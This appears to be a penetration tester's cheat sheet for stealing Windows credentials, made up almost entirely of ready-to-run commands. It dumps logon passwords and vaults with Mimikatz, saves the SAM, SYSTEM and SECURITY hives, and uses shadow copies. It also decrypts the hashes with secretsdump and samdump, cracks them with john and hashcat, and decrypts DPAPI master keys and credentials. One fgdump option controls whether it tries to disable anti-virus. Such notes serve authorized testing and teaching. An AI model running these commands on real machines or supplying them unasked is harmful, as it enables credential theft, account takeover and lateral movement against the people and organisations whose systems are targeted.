# Credentials and Tickets

## Enumerate Users And Hashes

```
privilege::debug
token::elevate

sekurlsa::logonpasswords 
sekurlsa::ekeys /aes128
sekurlsa::ekeys /aes256

vault::cred
vault::list
```

## NTLM From Password

```
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

## ShadowCopy Exploit

It is possible to retrieve and dump keys from old backup versions of the system saved with ShadowCopy. Once the backup version is exposed you can dump the SAM credentials and extract  DPAPI hashes

Enumerate copies

```
vssadmin list shadows
diskshadow list shadows all
```

Create a link to the copy

```
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\<shadow copy volume name>\
```

## SAM credentials dump

### Dumping

#### Manual

Administrative privileges are required to dump register keys

```
reg.exe save hklm\sam c:\dp\sam.save
reg.exe save hklm\system c:\dp\system.save
reg.exe save hklm\security c:\dp\security.save
```

Possible backups location

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

#### fgdump.exe

Runs locally, creates a file with the hashes.

```
fgdump.exe
fgdump.exe -t    #test for anti-virus presence
fgdump.exe -a    #don't try to disable anti-virus
fgdump.exe -r    #ignore existing dump files
```

#### Mimikatz

```
lsadump::sam                 //SAM database
lsadump::secrets             //SAM secrets
```

### Decryption

Impacket - secretsdump.py

```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Samdump or Pwdump

```
samdump2 system.save sam.save
pwdump SYSTEM SAM > <file>
```

After obtaining the hashes they can be cracked to obtain the passwords or used in Pass the Hash attacks.

```
john -format=NT -wordlist=<wordlist> <hashfile>
hashcat -m 1000 -a 0 --force --show --username <hash> <wordlist> #rows follow the format <user>:<hash>
```

## DPAPI hash dump

Usual credential files position

```
%appdata%\Microsoft\Credentials\
%localappdata%\Microsoft\Credentials\
%appdata%\Microsoft\Protect\<usersid>\    //master key
```

Enumerate Credentials hashes. The parameter `guidMasterKey` reveals the hash of the master key

```
dpapi::cred /in:"<path to cred hash>" 
```

Retrieve the master key, decode it and store the key in cache. In order to decrypt the key we need to be operating under the same context (user, system) the key belongs to.&#x20;

```
dpapi::masterkey /in:"<Path to MasterKeyGUID>" 
dpapi::masterkey /in:"<Path to MasterKeyGUID>" /rpc
dpapi::cache
```

Decrypt other hashes with the master key

```
dpapi::cred /in:"<path to CredHash>"
```
